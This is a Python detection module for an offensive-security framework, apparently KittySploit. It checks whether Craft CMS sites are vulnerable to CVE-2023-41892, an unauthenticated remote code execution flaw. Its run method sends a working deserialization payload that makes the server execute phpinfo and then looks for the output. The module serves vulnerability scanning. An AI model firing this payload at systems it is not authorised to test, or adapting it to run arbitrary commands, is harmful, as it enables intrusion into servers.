#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Craft CMS is a platform for creating digital experiences."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CraftCMS < 4.4.15 - Unauthenticated Remote Code Execution Detection',
        'description': 'Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector leading to Remote Code Execution (RCE). Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'rce', 'unauth', 'craftcms', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g',
            'https://blog.calif.io/p/craftcms-rce',
            'https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical',
            'https://github.com/craftcms/cms/commit/7359d18d46389ffac86c2af1e0cd59e37c298857',
            'https://github.com/craftcms/cms/commit/a270b928f3d34ad3bd953b81c304424edd57355e',
        ],
        'cve': 'CVE-2023-41892',
    }

    def run(self):
        path = '/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\\\GuzzleHttp\\\\Psr7\\\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}\n')
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('php credits', 'php group', 'craftcms',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='CraftCMS < 4.4.15 - Unauthenticated Remote Code Execution detected', path=path)
            return True
        return False

